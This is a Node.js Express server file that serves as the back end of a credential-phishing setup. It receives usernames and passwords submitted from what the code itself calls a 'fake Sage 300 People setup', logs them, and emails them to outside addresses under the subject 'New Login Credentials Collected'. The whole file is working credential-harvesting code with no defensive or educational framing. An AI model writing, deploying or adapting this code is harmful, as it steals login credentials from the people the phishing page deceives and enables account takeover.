import express from 'express';
import nodemailer from 'nodemailer';
import cors from 'cors';

const app = express();
app.use(express.json());
app.use(cors({
    origin: '*',
    methods: ['POST'],
    allowedHeaders: ['Content-Type']
}));

// Create test account and transporter
let transporter;

async function createTransporter() {
    // Generate test SMTP service account
    const testAccount = await nodemailer.createTestAccount();
    console.log('Created Ethereal account:', testAccount.user);

    // Create reusable transporter
    transporter = nodemailer.createTransport({
        host: "smtp.ethereal.email",
        port: 587,
        secure: false,
        auth: {
            user: testAccount.user,
            pass: testAccount.pass
        }
    });
}

// Initialize transporter
createTransporter();

app.post('/api/submit-credentials', async (req, res) => {
    console.log('Received credentials:', req.body);

    const { username, password, profile, timestamp } = req.body;

    try {
        console.log('Attempting to send email...');
        // Send email
        const info = await transporter.sendMail({
            from: '"Credential Collector" <collector@example.com>',
            to: "it@chem-labs.com", // Replace with your email
            cc: "it@huqas.org",
            subject: "New Login Credentials Collected",
            html: `
                <h3>New credentials collected from fake Sage 300 People setup:</h3>
                <p><strong>Username:</strong> ${username}</p>
                <p><strong>Password:</strong> ${password}</p>
                <p><strong>Profile:</strong> ${profile}</p>
                <p><strong>Timestamp:</strong> ${timestamp}</p>
            `
        });

        console.log('Preview URL:', nodemailer.getTestMessageUrl(info));

        console.log('Email sent successfully');
        res.json({ success: true });
    } catch (error) {
        console.log('Failed to send email:', error);
        console.error('Error sending email:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
